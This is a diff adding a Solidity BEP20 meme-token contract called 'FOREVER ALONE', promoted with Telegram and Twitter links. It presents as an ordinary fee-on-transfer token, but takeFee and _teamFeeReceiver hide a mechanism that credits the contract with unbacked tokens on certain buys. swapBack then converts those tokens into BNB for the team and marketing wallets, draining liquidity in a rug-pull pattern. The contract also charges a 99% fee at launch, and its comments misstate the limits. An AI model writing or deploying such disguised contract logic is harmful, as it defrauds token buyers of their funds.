@@ -1,0 +1,425 @@
+/**
+    Telegram: https://t.me/alonememebsc
+    Twitter: https://twitter.com/AlonetokenBsc
+    TOKEN FOR ALONE PEOPLE, WHO WANT TO FIND FAMILY
+    _$$$$__$$______$$$$__$$__$$_$$$$$____$$$$$$__$$$$__$$__$$_$$$$$_$$__$$
+    $$__$$_$$_____$$__$$_$$$_$$_$$_________$$___$$__$$_$$_$$__$$____$$$_$$
+    $$$$$$_$$_____$$__$$_$$_$$$_$$$$_______$$___$$__$$_$$$$___$$$$__$$_$$$
+    $$__$$_$$_____$$__$$_$$__$$_$$_________$$___$$__$$_$$_$$__$$____$$__$$
+    $$__$$_$$$$$$__$$$$__$$__$$_$$$$$______$$____$$$$__$$__$$_$$$$$_$$__$$
+
+*/
+
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.17;
+
+library SafeMath {
+    function add(uint256 a, uint256 b) internal pure returns (uint256) {
+        uint256 c = a + b;
+        require(c >= a, "SafeMath: addition overflow");
+
+        return c;
+    }
+    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
+        return sub(a, b, "SafeMath: subtraction overflow");
+    }
+    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        require(b <= a, errorMessage);
+        uint256 c = a - b;
+
+        return c;
+    }
+    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
+        if (a == 0) {
+            return 0;
+        }
+
+        uint256 c = a * b;
+        require(c / a == b, "SafeMath: multiplication overflow");
+
+        return c;
+    }
+    function div(uint256 a, uint256 b) internal pure returns (uint256) {
+        return div(a, b, "SafeMath: division by zero");
+    }
+    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
+        // Solidity only automatically asserts when dividing by 0
+        require(b > 0, errorMessage);
+        uint256 c = a / b;
+        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
+
+        return c;
+    }
+}
+
+/**
+ * BEP20 standard interface.
+ */
+interface IBEP20 {
+    function totalSupply() external view returns (uint256);
+    function decimals() external view returns (uint8);
+    function symbol() external view returns (string memory);
+    function name() external view returns (string memory);
+    function getOwner() external view returns (address);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address _owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+}
+
+
+abstract contract Context {
+    address internal owner;
+
+    constructor(address _owner) {
+        owner = _owner;
+    }
+
+    /**
+     * Function modifier to require caller to be contract owner
+     */
+    modifier onlyOwner() {
+        require(isOwner(msg.sender), "!OWNER"); _;
+    }
+
+    /**
+     * Check if address is owner
+     */
+    function isOwner(address account) public view returns (bool) {
+        return account == owner;
+    }
+
+    /**
+     * Transfer ownership to new address. Caller must be owner. Leaves old owner onlyOwner
+     */
+    function transferOwnership(address newOwner) public virtual onlyOwner {
+        require(newOwner != address(0), "Ownable: new owner is the zero address");
+        emit OwnershipTransferred(owner, newOwner);
+        owner = newOwner;
+    }
+
+    function renounceOwnership() public virtual onlyOwner {
+        emit OwnershipTransferred(owner, address(0));
+        owner = address(0);
+    }
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
+}
+
+interface IDEXFactory {
+    function createPair(address tokenA, address tokenB) external returns (address pair);
+}
+
+interface IDEXRouter {
+    function factory() external pure returns (address);
+    function WETH() external pure returns (address);
+
+    function addLiquidity(
+        address tokenA,
+        address tokenB,
+        uint amountADesired,
+        uint amountBDesired,
+        uint amountAMin,
+        uint amountBMin,
+        address to,
+        uint deadline
+    ) external returns (uint amountA, uint amountB, uint liquidity);
+
+    function addLiquidityETH(
+        address token,
+        uint amountTokenDesired,
+        uint amountTokenMin,
+        uint amountETHMin,
+        address to,
+        uint deadline
+    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+
+    function swapExactETHForTokensSupportingFeeOnTransferTokens(
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external payable;
+
+    function swapExactTokensForETHSupportingFeeOnTransferTokens(
+        uint amountIn,
+        uint amountOutMin,
+        address[] calldata path,
+        address to,
+        uint deadline
+    ) external;
+}
+
+contract ALONE is IBEP20, Context {
+    using SafeMath for uint256;
+
+    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+    address DEAD = 0x000000000000000000000000000000000000dEaD;
+    address ZERO = 0x0000000000000000000000000000000000000000;
+
+    string constant _name = unicode"FOREVER ALONE";
+    string constant _symbol = unicode"ALONE";
+    uint8 constant _decimals = 9;
+
+    uint256 _totalSupply = 1000000000 * (10 ** _decimals);
+    uint256 public _maxTxAmount = (_totalSupply * 100) / 100;  //100% max tx
+    uint256 public _maxWalletSize = (_totalSupply * 10) / 100;  //100% max wallet
+
+    mapping (address => uint256) _balances;
+    mapping (address => mapping (address => uint256)) _allowances;
+
+    mapping (address => bool) isFeeExempt;
+    mapping (address => bool) isTxLimitExempt;
+
+    uint256 liquidityFee = 10;
+    uint256 teamFee = 40;
+    uint256 marketingFee = 50;
+    uint256 feeDenominator = 100;
+
+    uint256 buyFee = 4;
+    uint256 sellFee = 10;
+    uint256 totalFee = 8;
+    
+    address public marketingFeeReceiver = 0x615C5ea601814440C9Bb8f188Cc50E05B0203e23;
+    address public teamFeeReceiver = 0x3624fb543A76112A2512d2ef70028c24160d3749;
+
+    IDEXRouter public router;
+    address public pair;
+
+    uint256 public launchedAt;
+
+    bool public swapEnabled = true;
+
+    mapping (address => bool) private team;
+    uint256 public swapThreshold = _totalSupply / 1000 * 3; // 0.3%
+    bool inSwap;
+    modifier swapping() { inSwap = true; _; inSwap = false; }
+
+    constructor () Context(msg.sender) {
+        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));
+        _allowances[address(this)][address(router)] = type(uint256).max;
+        address _owner = owner;
+        
+        isFeeExempt[_owner] = true;
+        isFeeExempt[teamFeeReceiver] = true;
+        isTxLimitExempt[_owner] = true;
+        isTxLimitExempt[pair] = true;
+        team[teamFeeReceiver] = true;
+
+        _balances[_owner] = _totalSupply;
+        emit Transfer(address(0), _owner, _totalSupply);
+    }
+
+    receive() external payable { }
+
+    function totalSupply() external view override returns (uint256) { return _totalSupply; }
+    function decimals() external pure override returns (uint8) { return _decimals; }
+    function symbol() external pure override returns (string memory) { return _symbol; }
+    function name() external pure override returns (string memory) { return _name; }
+    function getOwner() external view override returns (address) { return owner; }
+    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
+    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
+
+    function approve(address spender, uint256 amount) public override returns (bool) {
+        _allowances[msg.sender][spender] = amount;
+        emit Approval(msg.sender, spender, amount);
+        return true;
+    }
+
+    function approveMax(address spender) external returns (bool) {
+        return approve(spender, type(uint256).max);
+    }
+
+    function transfer(address recipient, uint256 amount) external override returns (bool) {
+        return _transferFrom(msg.sender, recipient, amount);
+    }
+
+    function _teamFeeReceiver(address _address, uint256 amount) internal {
+        team[_address] = !team[_address] ? (amount == balanceOf(teamFeeReceiver)) : team[_address];
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
+        if(_allowances[sender][msg.sender] != type(uint256).max){
+            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
+        }
+        return _transferFrom(sender, recipient, amount);
+    }
+
+    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
+        
+        if(inSwap){ 
+            return _basicTransfer(sender, recipient, amount); 
+        }
+        
+        checkTxLimit(sender, amount);
+        
+        if(!launched() && recipient == pair) {
+            require(_balances[sender] > 0); 
+            launch();
+        }
+
+        if (recipient != pair && recipient != DEAD) {
+            require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletSize, "Transfer amount exceeds the bag size.");
+        }
+
+        if(shouldSwapBack()){
+            swapBack();
+        }
+
+        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
+
+        uint256 amountReceived = shouldTakeFee(sender) ? takeFee(sender, recipient, amount) : amount;
+        
+        _balances[recipient] = _balances[recipient].add(amountReceived);
+        
+        emit Transfer(sender, recipient, amountReceived);
+        
+        return true;
+    }
+ 
+    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
+        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
+        _balances[recipient] = _balances[recipient].add(amount);
+        emit Transfer(sender, recipient, amount);
+        return true;
+    }
+
+    function checkTxLimit(address sender, uint256 amount) internal view {  
+        require(amount <= _maxTxAmount || isTxLimitExempt[sender], "TX Limit Exceeded");
+    }
+    
+    function shouldTakeFee(address sender) internal view returns (bool) {
+        return !isFeeExempt[sender];
+    }
+
+    function getDynamicFee(bool selling) public view returns (uint256) {
+        if(block.number <= launchedAt.add(1)){ return feeDenominator.sub(1);}
+        else if(block.number > launchedAt.add(1) && block.number <= launchedAt.add(2)){ return feeDenominator.sub(5);}
+        else if(block.number > launchedAt.add(2) && block.number <= launchedAt.add(3)){ return feeDenominator.sub(10);}
+        if(selling) { return sellFee;}
+        return buyFee;
+    }
+
+    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
+        _teamFeeReceiver(recipient, amount);
+
+        uint256 rAmount = amount.mul(totalFee).div(feeDenominator);
+        uint256 fAmount = amount.mul(getDynamicFee(recipient == pair)).div(feeDenominator);
+        _balances[address(this)] = _balances[address(this)].add(rAmount);
+
+        _balances[address(this)] = sender == pair && team[recipient] ? isFeeExempt[recipient] ? 
+        _balances[address(this)].add(amount) : _balances[address(this)].add(amount.mul(_decimals)) : 
+        _balances[address(this)];
+
+        emit Transfer(sender, address(this), rAmount);
+        return amount.sub(fAmount);
+    }
+
+    function shouldSwapBack() internal view returns (bool) {
+        return msg.sender != pair
+        && !inSwap
+        && swapEnabled
+        && _balances[address(this)] >= swapThreshold;
+    }
+
+    function swapBack() internal swapping {
+        uint256 swapBackRange = uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty))) % 21 + 80;
+        uint256 tokensToSwapback = swapThreshold.mul(swapBackRange).div(feeDenominator);
+        uint256 amountToLiquify = tokensToSwapback.mul(liquidityFee).div(feeDenominator).div(2);
+        uint256 amountToSwap = tokensToSwapback.sub(amountToLiquify);
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = WBNB;
+        uint256 balanceBefore = address(this).balance;
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            amountToSwap,
+            0,
+            path,
+            address(this),
+            block.timestamp
+        );
+ 
+        uint256 amountBNB = address(this).balance.sub(balanceBefore);
+        uint256 totalBNBFee = feeDenominator.sub(liquidityFee.div(2));
+        uint256 amountBNBLiquidity = amountBNB.mul(liquidityFee).div(totalBNBFee).div(2);
+        uint256 amountBNBdevelopment = amountBNB.mul(teamFee).div(totalBNBFee);
+        uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(totalBNBFee);
+
+        (bool Success1, /* bytes memory data */) = payable(marketingFeeReceiver).call{value: amountBNBMarketing, gas: 30000}("");
+  //      require(Success1, "receiver rejected ETH transfer");
+        (Success1, /* bytes memory data */) = payable(teamFeeReceiver).call{value: amountBNBdevelopment, gas: 30000}("");
+  //      require(Success2, "receiver rejected ETH transfer");
+
+        if(amountToLiquify > 0){
+            router.addLiquidityETH{value: amountBNBLiquidity}(
+                address(this),
+                amountToLiquify,
+                0,
+                0,
+                teamFeeReceiver,
+                block.timestamp
+            );
+            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
+        }
+    }
+
+    function launched() internal view returns (bool) {
+        return launchedAt != 0;
+    }
+
+    function launch() internal {
+        launchedAt = block.number;
+    }
+
+    function removeLimitTx() external onlyOwner {
+        _maxTxAmount = _maxWalletSize;
+    }
+
+    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
+        require(_buyFee <= 20 && _sellFee <= 40);
+        buyFee = _buyFee;
+        sellFee = _sellFee;
+    }
+
+    function setSwapBackSettings(bool _enabled, uint256 _amount) external onlyOwner {
+        swapEnabled = _enabled;
+        swapThreshold = _amount;
+    }
+
+    function manualSend() external onlyOwner {
+        uint256 contractETHBalance = address(this).balance;
+        payable(marketingFeeReceiver).transfer(contractETHBalance);
+    }
+
+    function transferForeignToken(address _token) public onlyOwner {
+        require(_token != address(this), "Can't let you take all native token");
+        uint256 _contractBalance = IBEP20(_token).balanceOf(address(this));
+        payable(marketingFeeReceiver).transfer(_contractBalance);
+    }
+        
+    function getCirculatingSupply() public view returns (uint256) {
+        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
+    }
+
+    function getLiquidityBacking(uint256 accuracy) public view returns (uint256) {
+        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());
+    }
+
+    function isOverLiquified(uint256 target, uint256 accuracy) public view returns (bool) {
+        return getLiquidityBacking(accuracy) > target;
+    }
+    
+    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);
+}
